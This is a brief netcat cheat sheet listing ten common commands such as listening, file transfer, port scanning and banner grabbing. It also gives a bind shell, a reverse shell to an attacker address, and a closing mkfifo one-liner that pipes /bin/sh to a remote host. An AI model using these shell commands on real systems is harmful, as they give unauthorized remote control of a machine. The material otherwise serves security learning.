---
title: Netcat Command List
date: 2026-01-05
category: commands
enrich: false
tags: netcat, cybersecurity, command reference
description: Top 10 essential commands for netcat.
---

# Netcat (nc) Command Guide

**Netcat** is the utility knife of TCP/IP networking. It reads and writes data across network connections.

## Top 10 Useful Commands

### 1. Listen (Server)
```bash
nc -lvnp 4444
```
**Explanation:** Listen (`-l`), verbose (`-v`), no-resolve (`-n`), port 4444 (`-p`). Used to catch reverse shells.

### 2. Connect (Client)
```bash
nc 10.10.10.10 80
```
**Explanation:** Connect to port 80. You can type manual HTTP requests here.

### 3. File Transfer (Receive)
```bash
nc -lvnp 4444 > outfile.txt
```
**Explanation:** Save received data to file.

### 4. File Transfer (Send)
```bash
nc 10.10.10.10 4444 < infile.txt
```
**Explanation:** Pipe file content into the connection.

### 5. Port Scan
```bash
nc -zv 10.10.10.10 1-1000
```
**Explanation:** Zero-I/O (`-z`) scan. checks if ports are open.

### 6. Banner Grabbing
```bash
nc -v 10.10.10.10 22
```
**Explanation:** Connects and prints the service banner (e.g., SSH version).

### 7. Bind Shell (Windows)
```bash
nc -lvnp 4444 -e cmd.exe
```
**Explanation:** Executes cmd.exe and sends I/O to connection. Dangerous.

### 8. Reverse Shell (Linux)
```bash
nc 10.10.10.10 4444 -e /bin/bash
```
**Explanation:** Connects back to attacker and exposes bash.

### 9. UDP Mode
```bash
nc -u -lvnp 4444
```
**Explanation:** Listen on UDP instead of TCP.

### 10. Chat
```bash
# Run nc on both sides
```
**Explanation:** Simple text chat between two machines.

## The Most Powerful Command
```bash
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.10.10 4444 >/tmp/f
```
**Explanation:** The "Netcat without -e" flag reverse shell. This one-liner creates a pipe to send shell output to netcat and read input from netcat, bypassing modern limitations.

